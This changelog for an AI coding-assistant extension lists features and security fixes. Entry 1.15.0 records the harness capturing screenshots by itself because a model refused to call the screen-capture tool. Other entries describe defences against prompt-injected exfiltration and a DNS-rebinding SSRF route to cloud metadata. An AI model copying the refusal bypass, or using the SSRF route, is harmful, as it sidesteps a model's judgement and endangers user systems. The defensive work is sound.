# Changelog

## 1.72.0

### Screenshot to UI

- New command **Parley: Screenshot to UI** — pick an image of a UI and Parley attaches it, prefills a "build this as self-contained HTML" prompt, and (on send) reproduces the layout/colors/text as an artifact that renders live in the design canvas. Reuses the existing vision + artifact-detection + design-canvas pipeline.


## 1.71.0

### Onboard & explain commits

- **Parley: Onboard Me to This Repo** — a new-contributor briefing: what the project is, its architecture and main modules, the key files/entry points, how to build/test/run, and a Mermaid structure diagram (from the README, manifest, and tracked-file tree).
- **Parley: Explain Commit / Compare Refs** — explain what a specific commit changes and why, or summarize the differences between two branches/refs (refs are validated to block shell injection).


## 1.70.0

### Docs

- README + FEATURES.md updated for the latest commands: Explain Symbol / hover-to-explain, CodeLens actions, Create Pull Request, Generate Release Notes, Explain Stack Trace, Port / Translate Code, and Split Into Logical Commits. Test-count badge refreshed to 388.


## 1.69.0

### Stack-trace explainer, code porting, commit splitting

- **Parley: Explain Stack Trace** — take a trace from the selection, clipboard, or an input box; Parley parses the frames (JS/TS, Python, generic), opens the top one that lives in your workspace, and explains the failure + a fix.
- **Parley: Port / Translate Code** — translate the selection (or file) to another language (TypeScript / Python / Go / Rust / Java / C# / …) idiomatically, opened in a new document.
- **Parley: Split Into Logical Commits** — analyze the uncommitted diff and propose grouping it into clean, self-contained commits with messages (advisory — you do the staging).


## 1.68.0

### Create PR & Release notes

- **Parley: Create Pull Request** (also in the Source Control menu) — generates a PR description from the branch diff, confirms with you, pushes the branch, and opens the PR via the GitHub CLI (gh), returning the URL. Outward-facing, so it always confirms first; the title is sanitized and the body passed via --body-file.
- **Parley: Generate Release Notes** — drafts grouped release notes / CHANGELOG entries (Features/Fixes/Docs/Chore + a suggested version bump) from the commits since the last tag, opened in a markdown doc and copied to the clipboard.


## 1.67.0

### CodeLens actions

- Optional **Parley: Explain · Test · Doc** CodeLens above functions, methods, and classes (from the language server document symbols). Each action focuses the symbol and runs Explain / Generate Tests / Add Docs. Off by default — enable with parley.codeLens.enabled.


## 1.66.0

### Hover to explain

- Hovering a symbol now shows an **"$(sparkle) Explain with Parley"** link (no model call until you click it). Clicking — or running **Parley: Explain Symbol** — explains the symbol under the cursor using the current file as context. Toggle the hover link with parley.hover.explain.


## 1.65.0

### Docs

- Added **FEATURES.md** — a complete, organized catalog of every feature (chat, agent tools, context/@-mentions, editing & review, inline completion + next-edit, testing & quality, git/GitHub, diagrams, multimodal, design canvas, web, MCP, computer use, memory/rules/skills, cost/usage, maintenance, safety, keyboard shortcuts). Linked prominently from the README.
- README: documented Predict Next Edit (ghost-Tab flow) and its diff-review variant, plus the parley.nextEdit.autoTrigger and parley.coverageCommand settings; refreshed the test-count badge.


## 1.64.0

### Next Edit: Cursor-Tab-style ghost flow (prototype)

- **Parley: Predict Next Edit** (Ctrl+Alt+N) now shows the predicted change as an inline ghost instead of only a modal diff. The target location is marked with a decoration + a status-bar hint; **Tab** jumps the caret there (when no other suggestion is open), which renders the replacement as native ghost text, and a second **Tab** accepts it. **Escape** dismisses. The Tab binding is tightly gated by a `parley.hasNextEdit` context key, so it never interferes with normal Tab.
- **parley.nextEdit.autoTrigger** (default off): auto-predict shortly after your edits settle, for a hands-free Cursor-Tab feel. Each prediction is a model call — enable with a fast model.
- The previous modal flow is still available as **Parley: Predict Next Edit (Diff Review)**.

_Prototype: the ghost/Tab interaction depends on live editor behavior I can't exercise headlessly — please try it and report anything off; Escape always clears it._


## 1.63.0

### Docs

- README command reference updated for the recently added commands: Diagram This, Predict Next Edit, Triage TODOs, Audit Dependencies, and Generate Tests for Uncovered Code.


## 1.62.0

### Predict Next Edit

- New command "Parley: Predict Next Edit" (Ctrl+Alt+N / Cmd+Alt+N): from your recent edits + the current file, Parley predicts the single most likely next change — a sibling case/branch, a related call site, a type, an import, a matching test — jumps to that spot, and offers it as a reviewable diff. Applied only on your approval and checkpointed (revertible), reusing the inline-edit review flow.


## 1.61.0

### Coverage-guided test generation

- New command "Parley: Generate Tests for Uncovered Code": runs your test suite with coverage (auto-derived from the test command — npm/jest/vitest, pytest --cov, go -cover — or set parley.coverageCommand), then has the agent write focused tests for the currently-uncovered lines/branches of the current file. Requires a trusted workspace (it runs the project test command).


## 1.60.0

### Maintenance commands: Triage TODOs & Audit Dependencies

- **Parley: Triage TODOs** scans the workspace for TODO/FIXME/HACK/XXX markers (via git grep), lists them in a picker, opens the one you choose at its line, and hands it to the agent to implement or justify.
- **Parley: Audit Dependencies** runs the auto-detected package-manager audit (npm / pnpm / yarn) and streams a plain-English explanation — what is affected, why it matters, and the exact remediation commands.


## 1.59.0

### Diagram This (Mermaid, inline)

- New command "Parley: Diagram This" (editor right-click submenu): pick a diagram kind — Structure (flowchart), Class diagram, Call/sequence flow, or Dependencies — and Parley renders a Mermaid diagram of the current file (or selection) inline in the chat. Turns a tangled module into a picture in one click.


## 1.58.0

### New context mentions: @blame, @issue, @pr

- **@blame** attaches git blame for the active selection (or whole file) — ask "why does this code exist / what was the intent."
- **@issue <n>** pulls a GitHub issue (title, body, comments) into context via the gh CLI — "implement @issue 142".
- **@pr [n]** pulls a GitHub pull request (the current branch by default, or a number) via gh.
- All three appear in the @ autocomplete and are wrapped as untrusted content.


## 1.57.0

### Opt-in network egress allowlist + clearer mode wording

- New setting **parley.allowedFetchHosts**: an optional allowlist for the agent's fetch_url and browser_navigate tools. Empty (default) keeps current behavior — any public host is reachable (private/loopback addresses are always SSRF-blocked). List hosts (e.g. ["docs.python.org","github.com"]) and the agent can only reach those hosts and their subdomains — a guardrail against a prompt-injected agent exfiltrating data to an arbitrary domain. It is a restricted (trusted-workspace-only) setting, so a malicious repo cannot weaken or redirect it.
- The **"Ask before edits"** mode description now makes clear it gates *file edits* — read/search, fetch_url, web_search, browser, and capture_screen still run automatically in every agent mode. README updated to match.


## 1.56.0

### Security hardening (audit fixes)

- **Untrusted workspaces can no longer run code via the test command.** "Parley: Fix Failing Tests" now refuses to run in an untrusted workspace (the test command — from settings or the repo own npm test script — is workspace-controlled code). And parley.testCommand, parley.verifyCommand, parley.conversationsDir, parley.webSearch.* and parley.computerUse.enabled are now in restrictedConfigurations, so a malicious repo .vscode/settings.json cannot set them.
- **Full mode respects Workspace Trust.** The agent auto-runs shell commands (run_command / run_tests) without a prompt only in a trusted workspace; an untrusted workspace prompts even in Full mode, and the command allowlist is honored only when trusted.
- **MCP tool results are now marked untrusted** (like fetch_url / web_search / browser output), so a compromised MCP server output carries a prompt-injection boundary.
- **Cryptographic CSP nonces.** The chat and design-canvas webviews now generate their script nonce with crypto.randomBytes instead of Math.random.

_Confirmed clean by the audit: the API key never leaves SecretStorage / the Authorization header (not logged, transcribed, or exported); the webview blocks XSS (markdown html:false, nonce-only CSP with no connect-src, artifact iframe sandboxed without allow-same-origin); command allowlist, SSRF vetting, path containment and secret redaction all hold._


## 1.55.0

### Close the fetch_url DNS-rebinding SSRF gap

- fetch_url now connects only to an address it has vetted at connect time. Previously the SSRF guard resolved and checked the host, then fetch re-resolved independently — a DNS-rebinding server could answer the check with a public IP and the connection with an internal one (e.g. 169.254.169.254 cloud metadata, loopback). The fetch now uses a custom DNS lookup that resolves, refuses if ANY resolved address is private/loopback/link-local, and connects only to that vetted address; literal-IP hosts are still checked up front, and every redirect hop is re-vetted.
- The fetch also caps downloaded bytes (5 MB) and decompresses gzip/deflate/br responses.

### Fixed

- Hardened a flaky test helper (wall-clock deadline instead of a fixed tick count) so the suite is deterministic under parallel load.


## 1.54.0

### Second deep recheck: fix a Stop-deadlock and review-pass regressions

- **Fixed a turn deadlock (ask mode).** If you pressed Stop while an edit approval card was pending — or during a multi-edit round after stopping an earlier card — the next edit awaited an abort event that had already fired, hanging the turn as busy until reload. It now resolves immediately when the turn is already stopped.
- **@codebase falls back to lexical after an embedding-model change.** The dimension-mismatch guard added in 1.53.0 made a fully stale semantic index return zero results instead of signalling failure, so lexical search never ran and @codebase attached nothing. It now falls back correctly.
- **run_command / run_tests**: output that exceeds the 16 MB buffer is now reported as "too much output" instead of a misleading "exceeded the timeout"; a spawn failure no longer shows a doubled "Command failed:" prefix.
- **Per-hunk edit review** ("Choose…") now works on CRLF files — previously EOL differences collapsed the change into one un-splittable hunk.
- Hardened the inline-completion cache key against a document URI containing the delimiter character.


## 1.53.0

### Deep code recheck: bug fixes from a full review

- **Inline completion could insert unbalanced code (fixed).** The suffix-overlap trimmer removed any trailing closer the text after the cursor also had — including a bracket the completion opened itself (e.g. it turned `fn(item)` into `fn(item`). It now trims a closer only when that closer is not balancing an opener inside the completion.
- **Fixed corrupt source bytes.** The inline-completion cache key held literal NUL/SOH control bytes (committed since 1.51.0, so the file read as binary). Replaced with a printable, collision-free key that includes the prefix length (different cursor splits of the same text no longer collide).
- **@codebase stale-index guard.** buildCodebaseRegion no longer emits empty content with a backwards line range when the index points past a shrunken file; it falls back to the file head.
- **run_tests / Fix Failing Tests** now surface a spawn failure message (bad cwd, missing shell) instead of reporting FAILED with (no output); guard when no workspace is open.
- **/verify** now resolves its test command with the same precedence as run_tests (testCommand, then verifyCommand fallback).
- Semantic ranking skips vectors whose dimension does not match the query (stale embedding model); diagnostics header omits warnings when they are excluded; blank-line trimming handles CRLF; removed useless escapes and a formatting drift flagged by lint.


## 1.52.0

### Unify the test-runner with /verify + README refresh

- /verify, the run_tests tool, and Fix Failing Tests now share one broad test-command detector (npm / pytest / cargo / go / maven / gradle) and honor either parley.testCommand or parley.verifyCommand — no more npm-only detection or two competing settings.
- /verify now drives the tests through the run_tests tool (reliable PASS/FAIL via the real exit code) instead of a raw run_command.
- README updated for @problems, PR-description, Add Docs + Ctrl+. code actions, the test-runner loop, MCP status view, @codebase matched-region attachment, native multi-file review, and inline-completion settings.


## 1.51.0

### Inline completion polish

- Per-language opt-out via parley.inlineCompletion.disabledLanguages (e.g. turn it off in markdown/plaintext).
- Configurable context window: parley.inlineCompletion.maxPrefixChars and maxSuffixChars.
- Small LRU cache of recent completions, so a cursor bounce or backspace-and-retype to a spot already completed is served instantly instead of round-tripping again.
- Suffix-overlap trimming: drops a trailing closing brace/paren/semicolon that the text right after the cursor already has, so completions no longer double a closer.


## 1.50.0

### Multi-file review opens one native diff editor

- Clicking "Review" on the end-of-turn changes summary now opens all changed files in VS Code native multi-file diff editor (a single scrollable before/after view) instead of spawning a separate diff tab per file. Falls back to per-file diffs if the editor is unavailable, and now handles up to 60 files (was 12).


## 1.49.0

### @codebase attaches the matched region, not the file head

- When @codebase uses the local semantic index, it now attaches the region around the best-matching chunk (a little context + one window, labeled @codebase path:from-to) instead of the top of the file. Semantic search already located the relevant lines; now that location is actually used, so large files contribute the code that matched the question.
- Lexical retrieval and small files are unchanged (still attach the head).


## 1.48.0

### MCP server status view

- New command "Parley: MCP Server Status" shows each configured MCP server (connected vs failed, transport, tool count) in a QuickPick; pick a server to list the tools it exposes to the agent, or see the exact error for one that failed to start. Previously this info was only in a transient toast and the output log.
- McpManager now retains the last connection outcome per server (including failures) so the status view can report why a server did not connect.


## 1.47.0

### Test-runner loop

- New run_tests agent tool: runs the project test suite (auto-detected from package.json test script / pytest / cargo / go / maven / gradle, or the new parley.testCommand setting) and reports PASS/FAIL plus failing-test output. Approved once like run_command.
- New command "Parley: Fix Failing Tests": runs the tests once; if they fail, hands the output to the agent to fix the root cause and re-run via run_tests until green (a closed loop in Agent/Full mode).
- New parley.testCommand setting to override the auto-detected command.

### Fixed

- Fixed two module-load-time references to mocked vscode enums that broke the bundle test (no user-facing effect in the real editor).


## 1.46.0

### Code actions: Add Docs, selection-aware Explain, Ctrl+. menu

- New command "Parley: Add Docs" (right-click submenu + Ctrl+. menu) adds idiomatic doc comments (JSDoc/docstrings) to the selection or file without changing behavior.
- "Explain" now explains your selection when you have one, instead of always explaining the whole file.
- Parley selection commands (Refactor / Edit / Generate tests / Add docs / Explain) now appear in the Ctrl+. lightbulb (Refactor) menu when text is selected, not just the right-click submenu.


## 1.45.0

### Generate PR Description

- New command "Parley: Generate PR Description" (also in the Source Control title menu) diffs the current branch against its merge-base with main/master and writes a clean, paste-ready GitHub PR description (title, Summary, Changes, Test plan) — opens in a markdown doc and is copied to the clipboard. Unlike "Review Current Branch", it produces only the description, no code review.
- Refactored the branch/merge-base resolution into a shared helper reused by Review Current Branch.


## 1.44.0

### @problems — pull diagnostics into context

- New @problems mention attaches the current errors and warnings from the Problems panel (errors first, grouped by file with line:col and the source/rule). Ask things like "fix the errors in @problems" or "why is @problems complaining". Shows in the @ autocomplete alongside @git / @terminal / @codebase.


## 1.43.0

### Image attachments show a clickable thumbnail

- Attaching an image (screenshot, paste, drop, or @file) now shows a mini thumbnail chip in the composer instead of a plain text chip. Click it to open the full image viewer (zoom / pan / download / next-prev / thumbnails). Non-image attachments keep the labeled chip.


## 1.42.2

### Fixed — yellow dot only on real warnings

- The yellow rail dot was applied to every note, including plain status ones like "Captured your screen…". Now only genuine warnings/heads-ups (⚠, "heads-up", "failed", "unavailable", etc.) get the yellow dot; informational notes use the normal neutral dot.


## 1.42.1

### Fixed — 📷 screenshot did nothing (no monitor picker)

- Clicking 📷 only focused the composer and never showed the monitor picker. Root cause: monitor enumeration (`Screen::AllScreens`) returns an empty list when the PowerShell script is piped over stdin, so Parley thought there were 0 monitors and silently fell back. `listMonitors` and `captureMonitor` now run via `-File` (the same reliable path the picker uses), so the per-monitor overlays appear and the chosen screen is captured.


## 1.42.0

### New — the Parley Design canvas has its own chat

- The **Parley Design** panel now hosts a **separate design chat**, independent from the main Parley chat. Type changes there ("make the header bigger", "use a dark theme") and it iterates the *current* artifact — each reply becomes a new version in place, without touching your main conversation.
- It runs a focused, tool-less turn on your selected model (the current artifact code is given as context; the model returns the full updated artifact). Streams live, with a Stop button, and works for HTML/SVG/React alike.
- The panel is now message-driven (set once, updated via messages), so new versions refresh the preview without wiping the design-chat log.


## 1.41.0

### New — design canvas opens automatically

- When a reply produces a UI, the **Parley Design** canvas now opens on its own — in the editor area, right where code opens — so you no longer press 🎨 a second time. It opens once per new design (kept separate from the chat), updates in place as you iterate, and does not pop open old designs when you switch conversations.
- Renamed the preview panel to **Parley Design**.


## 1.40.5

### Changed — design button prefills a request when empty

- Clicking the composer 🎨 design button when there is nothing to preview now prefills "Design a " in the composer and focuses it (instead of a dead-end notice), so it kicks off a UI. If a preview already exists it opens the canvas as before; an existing draft is never overwritten.


## 1.40.4

### Changed — smaller slash keycap

- The `/` keycap frame is now a small inset badge hugging the glyph, while its button keeps the shared icon footprint — so it looks snug and the row stays evenly spaced.


## 1.40.3

### Changed — removed the textarea resize grip

- Turned off the composer textarea's resize handle (the diagonal grip that showed just above the Send button).


## 1.40.2

### Changed — mode button matches the model selector

- The mode button (Chat/Auto/…) now uses the dropdown background instead of black, so it matches the model selector next to it.


## 1.40.1

### Changed — uniform composer icon spacing

- All composer icon buttons now share one fixed 28×26 footprint, so the spacing between them is even (the `/` keycap frames that same box instead of being narrower).


## 1.40.0

### New — design canvas part 2: React/JSX + Tailwind

- The preview panel now renders **React/JSX & TSX** artifacts: React 18 + Babel (standalone) are bundled and inlined into the sandboxed preview, so ```jsx / ```tsx / ```react blocks run in-browser (mount a top-level `App`, or render yourself). 
- **Tailwind** utility classes now work in both React and HTML previews — the Tailwind browser runtime is inlined **only when the code actually uses Tailwind classes**, so plain HTML keeps its own styling (no surprise Preflight reset).
- Runtimes are vendored locally (no CDN), so previews stay offline and CSP-safe. Doc assembly + the Tailwind heuristic are unit-tested (372 tests).

### Changed

- Tightened the `/` slash keycap frame.


## 1.39.0

### New — design-canvas icon in the composer

- Added a persistent **design canvas** icon (palette) to the composer bar that opens the live preview of the latest HTML/SVG the model built. If nothing is previewable yet, it says so instead of doing nothing. (The top-row preview button still auto-appears when a reply contains previewable code.)


## 1.38.0

### Changed — monochrome line icons everywhere + yellow warning dot

- Extended the professional line-icon set to the **rest of the UI**: the top row (New, History, Usage, Preview, Refresh, Settings), the title row (back, Compact, Export, Archive, Delete, New, Rename), the jump-to-latest and history-close buttons, and the history-list row actions (rename/archive/delete). No more mixed emoji.
- **Warning / heads-up notes** now show a **yellow** dot on the rail (alongside green = tool done, red = error, white = message).


## 1.37.0

### Changed — professional monochrome icons in the composer

- Replaced the composer bar's colorful emoji with clean, monochrome **line icons** (Lucide/Feather style, theme-colored) — Upload, Add context, Browse the web, Attach, Mic, Voice mode, Screenshot, Record, Computer control, Settings, and Regenerate. Mic/record now show state via the red pulse rather than swapping to an emoji.


## 1.36.4

### Changed — larger tooltip text

- The hover tooltip uses a slightly larger font (and a touch more padding) for easier reading.


## 1.36.3

### Changed — stronger slash keycap border

- The **/** slash-command keycap now has a more prominent (thicker, higher-contrast) frame.


## 1.36.2

### Changed — styled tooltips + framed slash key

- Hover tooltips are now **dark, rounded, theme-matched** (like VS Code's hover widget) instead of the OS's white native box — applied to every element with a `title`, including dynamically-added ones.
- The **/** slash-command button is now framed as a **keycap** rather than a bare "/".

## 1.36.1

### Changed — Add actions are now three explicit icons

- Replaced the composer's `＋` menu with three direct icons: **📤 Upload from computer**, **📄 Add context** (`@`), and **🌐 Browse the web** (`@browser `).

## 1.36.0

### New — composer "add" menu + slash and regenerate buttons

- **＋** in the composer opens an **Add** menu: **Upload from computer** (attach a file/image), **Add context** (insert `@` to reference a file or symbol), and **Browse the web** (insert `@browser ` to open a URL and attach the rendered page).
- **/** opens the slash-command menu.
- **↻** regenerates the last reply.

## 1.35.0

### Changed — split app-level vs conversation-level actions across the two header rows

- **Top row (Parley):** now app/session-level — New, History, Usage, Design preview, Refresh models, and **Settings** (moved up from the title row).
- **Title row:** now conversation-level — back, the title, and the actions that act on *this* conversation: **Compact, Export, Archive, Delete**, New, and Rename (moved down from the top row).
- Removed the duplicate Rename icon from the top row and the redundant `⋯` menu (its actions are now explicit icons).

## 1.34.3

### Fixed — green/red tool-step dots weren't showing

- A CSS specificity bug (since the rail was generalized in 1.30.0) let the neutral white base color override the tool-step colors, so every dot rendered white. Dot color is now driven by a custom property set on the node, so a completed tool step shows **green**, an errored one **red**, and a running one **pulses** — as intended. (Plain text answers stay white; green only appears on tool steps.)

## 1.34.2

### Fixed — rail now runs down the whole answer

- The timeline rail previously drew a connecting line only when another step followed, so a single or final answer showed just a lone dot with an empty gutter beside all its text. The rail now runs down each step's full height (and still bridges to the next step within a thread), so every answer has a continuous rail alongside it.

## 1.34.1

### Changed — your prompt starts a thread (no rail dot)

- A user message now sits **off** the timeline rail — no dot and no connecting line into or out of it — because your input marks the start of a new thread. The rail (dots + line) belongs to the response beneath it, matching Claude Code. User prompts stay left-aligned and full-width.

## 1.34.0

### Changed — Codex-style conversation header

- The conversation title line is now a proper header: a **← back arrow** (opens past conversations) on the left, the title in a **larger, full-strength** font (was small and greyed), and action icons on the right — **⋯** (more: export / compact / archive / delete), **↻** (new conversation), **⚙** (settings), and **✎** (rename inline).

## 1.33.1

### Fixed — timeline rail lines were cut between messages

- The connecting line on the step rail stopped ~22px below each dot, far short of the next one (messages reserve ~32px on top for hover actions, so dots sit ~60px apart) — leaving visible gaps. The connector now bridges that full distance, so the rail reads as one continuous line.

## 1.33.0

### New — full image viewer

- Click any image (sent or received) to open a full viewer with **zoom in/out** (buttons, +/− keys, or scroll wheel) and a live **%** readout, **drag-to-pan** when zoomed, **download**, **‹ › next/previous** navigation across every image in the conversation (or ← → keys), a **thumbnail strip**, and **✕ / Esc** to close.

## 1.32.0

### New — design canvas (Artifacts), part 1: live HTML/SVG preview

- When a reply contains previewable code — a ```html, ```svg, or full HTML document — a **🎨 button** appears in the toolbar. Click it to open **Parley Preview** beside the chat: a live, sandboxed render of what the model built.
- **Version history** (each re-emit is a new version, with ◀ ▶ / dropdown navigation), plus **Open code** (source in an editor) and **Export** (save to a file).
- Model-agnostic — it renders whatever HTML/SVG any model produces. Detection is unit-tested (370 total).
- *Next:* part 2 adds **React/JSX + Tailwind** rendering via bundled runtimes.

## 1.31.0

### New — regenerate the last reply

- Hover the most recent assistant reply and click **↻** to re-run your last message in place (it drops the old answer instead of duplicating the question). Want a different take? Switch the **model** or **mode** first, then hit ↻ to retry with it. Also available as the **Parley: Regenerate** command.

## 1.30.0

### Changed — fully continuous timeline (Codex-style)

- Your prompts now ride the **same vertical rail** as everything else (left-aligned, with an accent-colored dot) instead of sitting off it as right-aligned bubbles. The timeline is now unbroken top-to-bottom — user turn → assistant → tool steps → cards — exactly like Codex / Claude Code.

## 1.29.0

### New — tool-step inspector

- Click any **⏺ tool step** on the timeline to expand it and see the **exact arguments** the agent passed and the **full raw result** (collapsed by default; long results scroll). Works live and on reloaded conversations. Invaluable for seeing exactly what an agent did — especially local-model agents.

## 1.28.0

### Improved — more local models work as agents (broader text-tool parsing)

- The text-protocol tool loop now understands the tool-call dialects emitted by more models beyond Hermes/Qwen `<tool_call>`: **`<function_call>` / `<tool_use>`**, **`<function=NAME>{…}</function>`** (Mistral/functionary), **DeepSeek's** `<｜tool▁call▁begin｜>…` tokens, and **fenced / bare JSON** `{"name","arguments"}`.
- The ambiguous formats (fenced/bare JSON) only count as a tool call when they name a **real available tool**, so ordinary JSON in an answer is never mistaken for one. Generation also halts at `</tool_call>` / `</function_call>` in text-tool mode. Parser covered by unit tests (358 total).

## 1.27.0

### Changed — continuous step rail + animated Parley feather

- The agent **timeline rail** is now continuous: every step node — assistant message, tool step, and every card (diffs, plan, changes, compare) — rides one vertical line with a **white** dot (message/output), **green** (tool done), **red** (tool error), or **pulsing** (running). Right-aligned user bubbles and dividers stay off the rail.
- The working-indicator spinner is now an **animated Parley feather** (a gently swaying quill) instead of the MIT bars.

## 1.26.0

### New — text-protocol models work as real agents

- Models with **native tool-calling** (Claude, GPT-5.x, Gemini…) already use it by default — nothing changes for them.
- Models **without** native tool-calling (many local/open models like DeepSeek, Qwen) emit tool calls as text — `<tool_call>{…}</tool_call>`. Parley now **parses those, runs them through the real tool executor, and feeds the actual `<tool_response>` back**, looping until the model answers — so they become working agents instead of narrating (and often fabricating) tool use. These calls show on the same `⏺`/`⎿` step timeline as native ones.
- To stop such models from hallucinating a tool result, generation halts at `</tool_call>` once text-tool mode is detected, and any fabricated response the model wrote is discarded in favor of the real one. Parser is unit-tested (352 tests).

## 1.25.0

### Improved — tidy rendering of text-format tool calls

- Some models (especially local/open ones without native tool-calling) emit tool calls as **text tags** — `<tool_call>{…}</tool_call>` and `<tool_response>…</tool_response>` — which previously rendered as an unreadable wall of raw JSON. Parley now turns each into a **clean labeled block**: `🔧 <tool name>` with pretty-printed, syntax-highlighted arguments, and `⎿ result` for the response (long results are clipped in the display). Models with native tool-calling continue to use the compact `⏺`/`⎿` step timeline.

## 1.24.0

### New — Codex-style conversation switcher

- **Click the conversation name** (the title line under the toolbar, now with a ⌄ caret) to open your **past conversations** — a searchable list with each conversation's **relative "last chat" time** (9m, 2h, 1d, 2w…) right-aligned, just like Codex. Hover a row for rename/archive/delete.
- The history search box is now labeled **"Search past conversations…"**.
- Renaming stays on the **✎** button; clicking the name browses instead of edits.

## 1.23.2

### Fixed — multi-monitor screenshot picker did nothing

- Clicking 📷 on a multi-monitor PC showed no picker and attached nothing. The overlay windows are drawn by a spawned PowerShell process, but it was launched with the script piped over stdin (`-Command -`), which can't pump a WinForms message loop — so `.Show()` silently no-opped. The picker now runs from a temp `-File` script (with a UTF-8 BOM, console hidden), so the click targets actually appear. Click detection also hardened to a `$global:` variable.

## 1.23.1

### Changed — mode button text color

- The mode button ("Chat"/"Ask"/"Auto"/…) now uses the same text color as the model selector (`--vscode-dropdown-foreground`) instead of pure white, so the two controls match.

## 1.23.0

### New — Claude Code-style agent timeline + animated MIT spinner

- **Step timeline:** each step of an agent turn now shows as a node on a vertical rail — a **gray** dot for narration, a **green** dot when a tool finishes, **red** on a tool error, and a **pulsing** dot for the step that's currently running. Tool calls each get their own compact row (`⏺ action` → `⎿ result`).
- **Thinking:** the reasoning panel now reads **"Thinking…"** live and collapses to **"Thought for Ns"** (wall-clock) — persisted, so it stays after reload.
- **Working indicator:** the status line's spinner is now an **animated MIT logo** (the maroon bars wave left-to-right) next to the live "…· N tokens" counter.
- **Model switches:** changing the model mid-conversation drops a centered **"Switched to <model>"** divider (wavy rules on both sides) into the transcript. It's a visual marker only — the model never sees it.

## 1.22.0

### Improved — monitor screenshots carry real-pixel coordinates

- When you attach a monitor screenshot (📷 or `/screenshot`), Parley now tells the model that monitor's **real-pixel space** — its resolution, its top-left position on the virtual desktop, and the scale factor of the shown image. So you can ask "what pixel is the X button at?" and get an answer in that monitor's real pixels, without cluttering the screenshot with a grid.
- The image stays clean; the coordinate context rides along in the next message's system prompt only.

## 1.21.0

### New — current-conversation title + quick actions in the header

- The **current conversation's title** now shows as a line just below the toolbar.
- **✎ (right of ＋)** renames the current conversation inline — click it (or the title line), type, Enter to save, Esc to cancel.
- **🗄 (after Export)** archives/unarchives the current conversation; the icon flips to **⇪** when it's archived.
- **🗑 (before Refresh)** deletes the current conversation after a confirmation dialog, then drops you into a fresh chat.

## 1.20.0

### New — monitor-aware screenshot: auto on one screen, click-a-screen on many

- Clicking **📷 Attach a screenshot** now (on Windows) skips the OS dialog: with a **single monitor** it captures that screen instantly and attaches it (not sent — ask about it, then send). With **multiple monitors** it drops a big dimmed **click target on every physical screen** — click the one you want (or press **Esc**). A small **countdown** ticks in the chat, and the pick auto-cancels after **5 seconds**.
- **Shift+click 📷** keeps the classic OS picker for grabbing a single application window.
- **`/screenshot`** is unified onto the same flow.
- On macOS/Linux (or if monitor enumeration fails) it transparently falls back to the OS picker, so nothing breaks. Built on the dependency-free PowerShell/.NET backend — no nut.js needed. Monitor-JSON parsing is unit-tested (344 tests).

## 1.19.1

### Changed — context checkboxes styled with a black background

- The Context toggles (Selection / File / Open editors / Diagnostics / Pick files) now render as custom black-background checkboxes with a white checkmark when ticked, instead of the default OS checkbox.

## 1.19.0

### New — Agent Skills (Claude-style, progressive disclosure)

- Define a skill as **`.parley/skills/<name>/SKILL.md`** — frontmatter `description:` (when to use it), body = the full step-by-step instructions, and bundle any helper scripts/resources in the same folder. **`Parley: Create Skill`** scaffolds one.
- **Progressive disclosure, exactly like Claude:** only each skill's *name + description* is always in the system prompt (a compact roster), so many skills cost almost nothing. When a task matches, the agent calls the new **`load_skill`** tool to pull that skill's full instructions on demand, then follows them — reading/running the skill's bundled files with the normal tools.
- The `load_skill` tool auto-enumerates available skills and disappears entirely when you have none. Skills are re-scanned each turn (edit one, it's live next message), work in every agent mode, and are excluded from subagents/plan-only flows. Loader + tool wiring are unit-tested (338 tests).

## 1.18.0

### New — choose: queue your next message, or steer the current answer

- When you type while Parley is working, a **⏳ Queue / ⏩ Steer toggle** appears by the Stop button:
  - **⏳ Queue** (new default) — your message waits and is answered as its **own turn after** the current one finishes. Queue several; they run in order. This matches what most people expect ("wait for it to finish, then answer this").
  - **⏩ Steer** — your message is **injected into the current answer** at its next step, redirecting the agent mid-task without stopping it (the previous behavior).
- Queued and steered messages show as distinct chips (⏳ / ⏩) with the right tooltip, each removable with ×; **Stop** clears the whole queue. The composer placeholder reflects the current choice.

## 1.17.0

### Changed — model & mode are now changeable while the agent is running

- The model dropdown and the mode button (Chat/Ask/Edit/Auto/…) are no longer locked while a turn is in progress. Switch them mid-run and the change applies to your **next** message (the current turn keeps the model/mode it started with). A mid-run switch can't disrupt the live reply — the streaming guard already prevents that. Tooltips note the "applies to your next message" behavior. (The ↻ refresh-models button stays locked mid-run, since re-fetching would re-render over the live reply.)

## 1.16.0

### New — coordinate grid for "which pixel is X" screenshot questions

- When you ask *where* something is on screen — "which pixel is the render button", "coordinates of the Save button", "where exactly is the menu" — Parley now overlays an **amber coordinate grid labeled in your screen's real pixels** on the captured screenshot, and tells the model to read locations off it and report `(x, y)` in real-pixel space. This is the standard technique for getting usable pixel estimates out of a vision model (which are otherwise poor at exact coordinates and unaware of scaling).
- Grid is drawn with jimp (the nut.js dependency already on disk); if it can't be produced, Parley still tells the model the screen's real resolution so its estimate is at least in the right coordinate space. Plain "look at my screen" requests are unaffected — no grid. Honest caveat: even with the grid, coordinates are approximate.

## 1.15.0

### Fixed — "screenshot my screen" now just works, even when the model won't

- Some models (notably Claude Opus) **refuse to call** the `capture_screen` tool, insisting "I have no tool that captures your screen" no matter how it's prompted. So Parley no longer depends on the model's willingness: when your message clearly asks to screenshot your screen ("paste a screenshot of my main monitor", "take a screenshot", "capture my screen"), Parley **captures it and attaches it to that message automatically** — the model then simply *receives* the image and responds.
- Works in **every mode** (including plain Chat, since it's a normal image attachment, not a tool call). The intent detector is precise — it ignores how-to questions ("how do I take a screenshot") and coding tasks ("add a screenshot button") — and only fires when a capture backend exists and you haven't already attached an image. The `capture_screen` tool and `/screenshot` command remain for explicit use.

## 1.14.0

### Fixed — captured screenshots no longer get "corrected" as hallucinations

- `capture_screen` was mislabeled in the transcript as **"🎨 Generated image"**, which led the model to conclude on a later turn that it had *synthesized a fake image* and retract an accurate description. Captures are now labeled **"📸 Screenshot captured"** — a real screen image, not a generated one.
- The captured screenshot now **persists across auto-continue steps**: it's carried in the turn's image set so every follow-up step still sees it. Previously the image existed only in the step that captured it, so the next step lost it and the model "reasoned" it must have made the description up.
- The system prompt now tells the agent that a successful `capture_screen` really adds the screen image to the conversation, to trust it, and to never later claim it was fabricated.

## 1.13.0

### New — click an inline image to enlarge it

- Inline images in the chat — screenshots, generated images, pasted/attached pictures — are now **click-to-zoom**: click any thumbnail to open it full-size in a lightbox, click anywhere (or press Esc) to close. Previously they were stuck at thumbnail size. Delegated handler, so it covers every inline image everywhere in the transcript.

## 1.12.0

### Improved — `capture_screen` now feeds the screenshot to the model

